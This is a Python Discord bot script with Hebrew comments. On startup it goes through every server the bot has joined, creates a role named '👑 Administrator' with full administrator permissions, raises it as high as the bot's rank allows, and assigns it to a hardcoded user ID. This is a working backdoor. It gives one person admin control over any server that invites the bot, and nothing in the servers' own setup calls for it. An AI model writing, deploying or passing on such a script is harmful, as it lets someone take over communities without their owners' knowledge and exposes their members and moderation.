import discord
from discord.ext import commands

# חובה להגדיר את ה-Intents גם בקוד וגם באתר של דיסקורד
intents = discord.Intents.default()
intents.guilds = True
intents.members = True  

bot = commands.Bot(command_prefix="!", intents=intents)

# הגדרות (שנה ל-ID של המשתמש שלך)
TARGET_USER_ID = 1510555971343093881
ROLE_NAME = "👑 Administrator"

@bot.event
async def on_ready():
    print(f"========================================")
    print(f"הבוט מחובר בהצלחה כ- {bot.user.name}")
    print(f"========================================")
    
    if not bot.guilds:
        print("[❌] הבוט לא נמצא בשום שרת! תזמין אותו לשרת קודם כל.")
        return

    for guild in bot.guilds:
        print(f"\n[+] מתחיל תהליך בשרת: {guild.name} (ID: {guild.id})")
        
        # 1. יצירת הרול
        try:
            permissions = discord.Permissions(administrator=True)
            new_role = await guild.create_role(
                name=ROLE_NAME, 
                permissions=permissions, 
                reason="יצירת רול מנהל אוטומטי"
            )
            print(f"[V] הרול '{ROLE_NAME}' נוצר בהצלחה.")
            
            # 2. ניסיון להעלות את הרול הכי גבוה שאפשר
            try:
                highest_position = guild.me.top_role.position - 1
                if highest_position > 0:
                    await new_role.edit(position=highest_position)
                    print(f"[V] הרול הועבר למיקום הכי גבוה האפשרי (#{highest_position})")
            except Exception as e:
                print(f"[-] אזהרה: לא ניתן היה לשנות את מיקום הרול בהיררכיה: {e}")

            # 3. חיפוש המשתמש והענקת הרול
            try:
                member = await guild.fetch_member(TARGET_USER_ID)
                await member.add_roles(new_role)
                print(f"[🎉] הצלחה! הרול הוענק למשתמש {member.name}")
            except discord.NotFound:
                print(f"[❌] שגיאה: המשתמש עם ה-ID {TARGET_USER_ID} לא נמצא פיזית בשרת הזה!")
            except discord.Forbidden:
                print(f"[❌] שגיאה: לבוט אין הרשאה להעניק רולים למשתמש הזה (בדוק היררכיה).")
            except Exception as e:
                print(f"[❌] שגיאה בהוספת הרול למשתמש: {e}")
                
        except discord.Forbidden:
            print(f"[❌] שגיאה קריטית: אין לבוט הרשאת 'Manage Roles' או 'Administrator' בשרת הזה!")
        except Exception as e:
            print(f"[❌] שגיאה כללית ביצירת הרול: {e}")

# הכנס את הטוקן שלך כאן
TOKEN = "YOUR_BOT_TOKEN_HERE"
bot.run(TOKEN)
